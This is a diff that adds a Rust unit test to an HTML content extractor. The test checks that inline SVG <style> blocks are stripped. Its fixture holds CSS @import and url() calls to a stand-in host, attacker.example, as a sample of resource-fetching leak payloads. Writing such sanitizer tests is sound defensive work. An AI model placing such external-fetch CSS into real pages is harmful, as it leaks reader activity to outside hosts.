@@ -28450,6 +28450,40 @@ Output: [0,1]</code></pre>
     }
 
     #[test]
+    fn removes_svg_styles_that_can_fetch_external_resources() {
+        let html = r#"
+        <!doctype html>
+        <html>
+          <head><title>SVG style leak</title></head>
+          <body>
+            <article>
+              <h1>SVG style leak</h1>
+              <p>This article paragraph contains enough readable prose for the content selector to keep the enclosing article.</p>
+              <svg viewBox="0 0 200 200" width="200" height="200">
+                <style>@import url("https://attacker.example/leak.css"); .x { fill: url("https://attacker.example/image.png"); }</style>
+                <circle class="x" cx="100" cy="100" r="80"></circle>
+              </svg>
+              <p>A second paragraph keeps the inline SVG in the extracted content while its unsafe stylesheet is removed.</p>
+            </article>
+          </body>
+        </html>
+        "#;
+
+        let output = parse_html_to_org(
+            html,
+            DefuddleOptions {
+                url: Some("https://example.com/svg-style".to_string()),
+                ..DefuddleOptions::default()
+            },
+        )
+        .unwrap();
+
+        assert!(!output.html.contains("<style"));
+        assert!(!output.html.contains("@import"));
+        assert!(!output.html.contains("attacker.example"));
+    }
+
+    #[test]
     fn conditional_exact_selector_cleanup_matches_case_insensitive_attrs() {
         let html = r##"
         <!doctype html>
